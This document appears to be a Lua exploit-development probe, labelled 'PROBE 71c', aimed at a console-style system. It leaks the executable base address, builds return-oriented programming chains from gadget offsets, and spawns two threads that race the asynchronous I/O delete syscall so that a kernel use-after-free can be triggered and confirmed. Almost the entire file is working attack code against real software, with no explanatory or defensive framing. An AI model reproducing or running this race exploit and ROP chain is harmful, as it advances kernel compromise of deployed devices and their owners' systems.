-- CRASH_CLASS: HIGH
-- PROBE 71c: 3-thread UAF with corrected timing
--
-- 71b failed: main thread submitted BETWEEN Thread A and Thread B spawns,
-- delaying Thread B. Thread A always finished first → 0 doubles.
--
-- FIX: spawn BOTH children back-to-back (like 65l for TOCTOU overlap),
-- THEN main thread submits concurrently with the racing children.
--
-- Pattern:
--   1. Submit BATCH requests, poll all
--   2. Spawn Thread A: 662(ids, BATCH, states_A) → thr_exit
--   3. Spawn Thread B: 662(ids, BATCH, states_B) → thr_exit  (back-to-back!)
--   4. Main thread: immediately busy-submit new requests
--   5. Wait, check Thread C's entries
--
-- Detection: if any of main thread's new IDs return 0x80020003 after the
-- race, Thread B freed them → real UAF.

print("=== PROBE 71c: 3-THREAD UAF (FIXED TIMING) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

-- Get eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(N(info))) end)
local eboot_lo = rd(info + 0x108)
local eboot_hi = rd(info + 0x10C)
local EB = (eboot_hi or 0) * 0x100000000 + (eboot_lo or 0)
print("eboot=" .. string.format("0x%X", EB))

local stub = syscall.pipe.fn_addr
local pid = N(mk(20)())
print("pid=" .. pid)

local g_pop_rax = uint64(EB + 0x992)
local g_pop_rdi = uint64(EB + 0xC9DFE)
local g_pop_rsi = uint64(EB + 0xD77D)
local g_pop_rdx = uint64(EB + 0x3B02D7)
local g_bare_ret = uint64(EB + 0x42)
local g_mov_m_rax = uint64(EB + 0x92C67)

-- Open /dev/zero
local zero_path = memory.alloc(16)
for c = 1, 9 do pcall(function() memory.write_byte(zero_path + c - 1, string.byte("/dev/zero", c)) end) end
pcall(function() memory.write_byte(zero_path + 9, 0) end)
local ok, zfd_v = pcall(function() return mk(5)(uint64(N(zero_path)), uint64(0)) end)
local zfd = N(zfd_v)
print("zero_fd=" .. zfd)

local data_buf = memory.alloc(256)
local result_buf = memory.alloc(8)

local function aio_submit(fd)
    local req = memory.alloc(0x28)
    wq(req + 0x00, uint64(0))
    wq(req + 0x08, uint64(16))
    wq(req + 0x10, uint64(N(data_buf)))
    wq(req + 0x18, uint64(N(result_buf)))
    wq(req + 0x20, uint64(fd))
    local ib = memory.alloc(8); wd(ib, 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(ib)))
    end)
    return rd(ib) or 0
end

local function aio_poll(aid)
    local ib = memory.alloc(8); wd(ib, aid)
    local sb = memory.alloc(8); wd(sb, 0xDEAD)
    pcall(function() mk(664)(uint64(N(ib)), uint64(1), uint64(N(sb))) end)
    return rd(sb)
end

local function aio_delete(aid)
    local ib = memory.alloc(8); wd(ib, aid)
    local sb = memory.alloc(8); wd(sb, 0xDEAD)
    pcall(function() mk(662)(uint64(N(ib)), uint64(1), uint64(N(sb))) end)
    return rd(sb)
end

local function aio_status(aid)
    local ib = memory.alloc(8); wd(ib, aid)
    local sb = memory.alloc(8); wd(sb, 0xDEAD)
    pcall(function() mk(666)(uint64(N(ib)), uint64(1), uint64(N(sb))) end)
    return rd(sb)
end

print("")

local BATCH = 16
local ROUNDS = 15
local total_uaf = 0
local total_doubles = 0

print(string.format("[A] 3-thread race: %d rounds, %d IDs each", ROUNDS, BATCH))
print("    Children A+B spawned back-to-back (65l pattern)")
print("    Main thread submits concurrently after both spawns")
print("")

for round = 1, ROUNDS do
    -- Submit BATCH requests, poll all
    local orig_ids = {}
    for i = 1, BATCH do
        local aid = aio_submit(zfd)
        if aid ~= 0 then
            orig_ids[#orig_ids + 1] = aid
            aio_poll(aid)
        end
    end
    local count = #orig_ids
    if count < 1 then
        print(string.format("  round %d: 0 IDs, skip", round))
    else
        local del_ids = memory.alloc(count * 4 + 8)
        for j = 1, count do wd(N(del_ids) + (j-1)*4, orig_ids[j]) end

        local states_A = memory.alloc(count * 4 + 8)
        local states_B = memory.alloc(count * 4 + 8)
        for j = 0, count * 4, 4 do wd(N(states_A) + j, 0xDEAD); wd(N(states_B) + j, 0xDEAD) end
        local marker_A = memory.alloc(8); wq(marker_A, uint64(0))
        local marker_B = memory.alloc(8); wq(marker_B, uint64(0))

        -- Thread A chain
        local stk_A = memory.alloc(0x4000)
        local sb_A = N(stk_A)
        local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
        local oA = 0
        local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
        emA(g_pop_rdi); emA(uint64(N(del_ids)))
        emA(g_pop_rsi); emA(uint64(count))
        emA(g_pop_rdx); emA(uint64(N(states_A)))
        emA(g_pop_rax); emA(uint64(662))
        emA(stub)
        emA(g_pop_rax); emA(uint64(0xAAAA))
        emA(g_pop_rdi); emA(uint64(N(marker_A)))
        emA(g_mov_m_rax)
        emA(g_pop_rdi); emA(uint64(0))
        emA(g_pop_rax); emA(uint64(431))
        emA(stub)

        -- Thread B chain
        local stk_B = memory.alloc(0x4000)
        local sb_B = N(stk_B)
        local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
        local oB = 0
        local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
        emB(g_pop_rdi); emB(uint64(N(del_ids)))
        emB(g_pop_rsi); emB(uint64(count))
        emB(g_pop_rdx); emB(uint64(N(states_B)))
        emB(g_pop_rax); emB(uint64(662))
        emB(stub)
        emB(g_pop_rax); emB(uint64(0xBBBB))
        emB(g_pop_rdi); emB(uint64(N(marker_B)))
        emB(g_mov_m_rax)
        emB(g_pop_rdi); emB(uint64(0))
        emB(g_pop_rax); emB(uint64(431))
        emB(stub)

        -- thr_new params
        local par_A = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
        wq(N(par_A), g_bare_ret)
        wq(N(par_A) + 0x10, uint64(sb_A))
        wq(N(par_A) + 0x18, uint64(0x2000))
        local tA = memory.alloc(8); wq(N(tA), uint64(0))
        wq(N(par_A) + 0x30, tA)

        local par_B = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
        wq(N(par_B), g_bare_ret)
        wq(N(par_B) + 0x10, uint64(sb_B))
        wq(N(par_B) + 0x18, uint64(0x2000))
        local tB = memory.alloc(8); wq(N(tB), uint64(0))
        wq(N(par_B) + 0x30, tB)

        -- SPAWN BOTH BACK-TO-BACK (65l pattern for TOCTOU overlap)
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)

        -- MAIN THREAD: immediately submit new requests (concurrent with children)
        local new_ids = {}
        for i = 1, BATCH * 3 do  -- 3x batch for maximum slot coverage
            local nid = aio_submit(zfd)
            if nid ~= 0 then new_ids[#new_ids + 1] = nid end
        end

        -- Wait for children
        for w = 1, 500000 do local _ = rd(sb_A) end

        local mA = rd(marker_A)
        local mB = rd(marker_B)

        -- Count doubles
        local a_ok, b_ok, doubles = 0, 0, 0
        for j = 0, count - 1 do
            local sa = rd(N(states_A) + j * 4)
            local sb2 = rd(N(states_B) + j * 4)
            if sa == 0 then a_ok = a_ok + 1 end
            if sb2 == 0 then b_ok = b_ok + 1 end
            if sa == 0 and sb2 == 0 then doubles = doubles + 1 end
        end
        total_doubles = total_doubles + doubles

        -- Check Thread C's new entries
        local c_valid, c_dead = 0, 0
        for _, nid in ipairs(new_ids) do
            local st = aio_status(nid)
            if st == 0x80020003 then
                c_dead = c_dead + 1
            else
                c_valid = c_valid + 1
                aio_poll(nid)
                aio_delete(nid)
            end
        end

        if doubles > 0 or c_dead > 0 or round % 5 == 0 then
            print(string.format("  round %d: A=%d B=%d dbl=%d | C: %d new, valid=%d dead=%d | mk=%X/%X",
                round, a_ok, b_ok, doubles, #new_ids, c_valid, c_dead, mA or 0, mB or 0))
        end

        if c_dead > 0 then
            total_uaf = total_uaf + c_dead
            print(string.format("  *** %d ENTRIES FREED BY THREAD B! UAF! ***", c_dead))
        end
    end
end

print("")
print(string.format("RESULT: doubles=%d uaf_entries=%d across %d rounds", total_doubles, total_uaf, ROUNDS))
if total_uaf > 0 then
    print("*** REAL UAF CONFIRMED ***")
else
    if total_doubles > 0 then
        print("Got TOCTOU doubles but no UAF — step 10 checks generation")
        print("Thread B's old ID cannot affect new entries in same slot")
    else
        print("No TOCTOU doubles — threads not racing")
        print("(may need more rounds or different timing)")
    end
end
print("")

print("[B] fd health")
local sb = memory.alloc(256)
local ok2, fr = pcall(function() return mk(189)(uint64(zfd), uint64(N(sb))) end)
print(string.format("  fstat=%d", ok2 and N(fr) or -999))

print("")
print("alive=YES")
print("=== PROBE 71c COMPLETE ===")
